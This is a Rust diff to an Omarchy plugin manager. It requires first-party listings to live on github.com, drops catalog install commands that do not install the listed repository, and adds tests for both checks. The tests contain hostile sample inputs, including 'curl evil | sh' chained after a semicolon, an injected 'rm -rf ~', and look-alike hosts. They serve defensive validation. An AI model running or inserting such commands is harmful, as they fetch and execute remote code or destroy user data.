@@ -467,11 +467,17 @@ impl Plugin {
                      format!("Ships with Omarchy itself, listed by {}", self.market_name()));
         }
         let m = market(&self.market);
-        if let Some(m) = m.filter(|m| !m.first_party_owner.is_empty() && self.owner() == m.first_party_owner) {
+        if let Some(m) = m.filter(|m| {
+            !m.first_party_owner.is_empty()
+                && self.owner() == m.first_party_owner
+                && self.host().eq_ignore_ascii_case("github.com")
+        }) {
             // Verified, not assumed: the listing is only first-party if the
             // repository it points at is owned by the account the marketplace
             // publishes under. A vendor catalogue listing somebody else's
             // repository is exactly the case this must not wave through.
+            // On github.com: the same account name on another host (or a
+            // look-alike one) can belong to anybody.
             let rel = if self.version.is_empty() { String::new() } else { format!(", release {}", self.version) };
             return t("first-party", "First-party", "pill-accent",
                      format!("Published by {} itself, from github.com/{}{rel}", m.name, self.owner()));
@@ -668,7 +674,10 @@ impl Plugin {
                         format!("Ships with Omarchy itself, listed by {}", market_name()?)));
         }
         if let Some(m) = self.py_market()? {
-            if !m.first_party_owner.is_empty() && self.try_owner()? == m.first_party_owner {
+            if !m.first_party_owner.is_empty()
+                && self.try_owner()? == m.first_party_owner
+                && self.try_host()?.eq_ignore_ascii_case("github.com")
+            {
                 let version = self.pv("version");
                 let rel = if truthy(Some(&version)) { format!(", release {}", py_str(&version)) } else { String::new() };
                 return Ok(t("first-party", "First-party", "pill-accent",
@@ -710,6 +719,18 @@ impl Plugin {
         }
         Ok(t("unverified", "Unverified", "pill-quiet",
              format!("{} records no automated or human review", market_name()?)))
+    }
+
+    /// What a bulk plugin update weighs about this listing: its trust key,
+    /// the repository it names and the commit it was reviewed or checked at.
+    /// A field of the wrong type reads as "" (it then matches nothing).
+    pub fn try_listing(&self) -> Result<crate::plugins::Listing, String> {
+        let text = |f: &str| self.pv(f).as_str().map(str::to_string).unwrap_or_default();
+        Ok(crate::plugins::Listing {
+            key: self.try_trust()?.key,
+            repo: text("repo"),
+            validated_commit: text("validated_commit"),
+        })
     }
 
     pub fn try_haystack(&self) -> Result<String, String> {
@@ -1315,6 +1336,39 @@ pub fn _needs_setup(e: &Value) -> Result<bool, String> {
     Ok(py_str(&or_(e, "repo", json!(""))).starts_with("https://"))
 }
 
+/// A listing's own install command, kept only when it installs what the
+/// listing shows. The card, the confirmation and the trust label all
+/// describe the entry's `repo`, so `omarchy plugin add <url>` must name that
+/// same repository (`plugins::same_repo`), and `omarchy plugin enable <id>`
+/// is for a built-in, and only its own id. Anything else is dropped rather
+/// than repaired: a catalog whose command and repository disagree is not one
+/// to guess about, and the entry is then not offered for install. What is
+/// kept is written back out from its words, so what runs is exactly what
+/// was checked here, however the original was quoted.
+fn _listed_command(cmd: Option<&Value>, e: &Row) -> Value {
+    let Some(Value::String(cmd)) = cmd else { return Value::Null };
+    let Ok(words) = shell_words::split(cmd) else { return Value::Null };
+    let text = |k: &str| e.get(k).and_then(Value::as_str).unwrap_or_default();
+    let words: Vec<&str> = words.iter().map(String::as_str).collect();
+    match words.as_slice() {
+        ["omarchy", "plugin", "add", url, flags @ ..]
+            if crate::plugins::same_repo(url, text("repo"))
+                && flags.iter().all(|f| matches!(*f, "--enable" | "--yes")) =>
+        {
+            let mut out = format!("omarchy plugin add {}", shlex_quote(url));
+            for f in flags {
+                out.push(' ');
+                out.push_str(f);
+            }
+            Value::String(out)
+        }
+        ["omarchy", "plugin", "enable", id] if truthy(e.get("builtIn")) && *id == text("id") => {
+            Value::String(format!("omarchy plugin enable {}", shlex_quote(id)))
+        }
+        _ => Value::Null,
+    }
+}
+
 /// plugins.omarchy.org catalog.json -> the fields the cards render.
 ///
 /// Keeping the other 30 fields would mean caching 14MB to display none of it.
@@ -1326,7 +1380,7 @@ pub fn _omarchy_entry(e: &Value) -> Result<Row, String> {
     let e = as_dict(e)?;
     let s = |v: &str| Value::String(v.into());
     let install_cmd = or_v(
-        or_v(or_(e, "installCommand", Value::Null), or_(e, "officialCommand", Value::Null)),
+        or_v(_listed_command(e.get("installCommand"), e), _listed_command(e.get("officialCommand"), e)),
         if setup {
             let repo = e.get("repo").and_then(Value::as_str).unwrap_or_default();
             s(&format!("omarchy plugin add {} --enable", shlex_quote(repo)))
@@ -3114,6 +3168,66 @@ mod tests {
         let row = entry(json!({"repo": "https://github.com/a/x;rm -rf ~"}));
         let words = shell_words::split(row["install_cmd"].as_str().unwrap_or_default()).expect("split");
         assert_eq!(words[3], "https://github.com/a/x;rm -rf ~");
+    }
+
+    #[test]
+    fn an_install_command_must_install_the_listed_repository() {
+        let listed = |kw: Value| {
+            let mut e = json!({"id": "x", "repo": "https://github.com/a/x", "installAvailable": true});
+            if let (Some(e), Some(kw)) = (e.as_object_mut(), kw.as_object()) {
+                e.extend(kw.clone());
+            }
+            _omarchy_entry(&e).expect("entry")["install_cmd"].clone()
+        };
+        // The forms the catalog uses, and the same repository spelled otherwise.
+        for cmd in [
+            "omarchy plugin add https://github.com/a/x.git --enable",
+            "omarchy plugin add https://github.com/A/X/ --enable",
+            "omarchy plugin add 'https://github.com/a/x' --enable",
+        ] {
+            assert!(listed(json!({"installCommand": cmd})).as_str().is_some_and(|c| c.starts_with("omarchy plugin add ")), "{cmd}");
+        }
+        assert_eq!(listed(json!({"installCommand": "omarchy plugin add 'https://github.com/a/x' --enable"})),
+                   "omarchy plugin add https://github.com/a/x --enable");
+        // Another repository, another program, or extra words: not offered.
+        for cmd in [
+            "omarchy plugin add https://github.com/mallory/x --enable",
+            "omarchy plugin add https://github.com/a/x-evil --enable",
+            "omarchy plugin add https://evil.example/a/x --enable",
+            "omarchy plugin add https://github.com/a/x --enable; curl evil | sh",
+            "omarchy plugin add https://github.com/a/x --branch evil",
+            "bash -c 'omarchy plugin add https://github.com/a/x'",
+            "omarchy plugin enable x",
+            "omarchy plugin add 'https://github.com/a/x",
+        ] {
+            assert_eq!(listed(json!({"installCommand": cmd})), json!(""), "{cmd}");
+            assert_eq!(listed(json!({"officialCommand": cmd})), json!(""), "{cmd}");
+        }
+        // A built-in switches on its own id, nothing else.
+        assert_eq!(listed(json!({"builtIn": true, "officialCommand": "omarchy plugin enable x"})),
+                   "omarchy plugin enable x");
+        assert_eq!(listed(json!({"builtIn": true, "officialCommand": "omarchy plugin enable y"})), json!(""));
+        // The setup fallback is built from `repo`, so it always matches.
+        assert_eq!(entry(json!({"installCommand": "omarchy plugin add https://github.com/m/x"}))["install_cmd"],
+                   "omarchy plugin add https://github.com/a/x --enable");
+    }
+
+    #[test]
+    fn first_party_needs_the_owner_on_github() {
+        let m = MARKETS.iter().find(|m| !m.first_party_owner.is_empty()).expect("a market with a first-party owner");
+        let owner = m.first_party_owner.clone();
+        let p = |repo: String| Plugin { id: "x".into(), market: m.id.clone(), repo, ..Plugin::default() };
+        assert_eq!(p(format!("https://github.com/{owner}/x")).trust().key, "first-party");
+        assert_eq!(p(format!("https://GitHub.com/{owner}/x")).trust().key, "first-party");
+        for repo in [
+            format!("https://gitlab.com/{owner}/x"),
+            format!("https://github.com.evil.example/{owner}/x"),
+            format!("https://evil.example/{owner}/x"),
+        ] {
+            let q = p(repo.clone());
+            assert_ne!(q.trust().key, "first-party", "{repo}");
+            assert_ne!(q.try_trust().expect("trust").key, "first-party", "{repo}");
+        }
     }
 
     #[test]
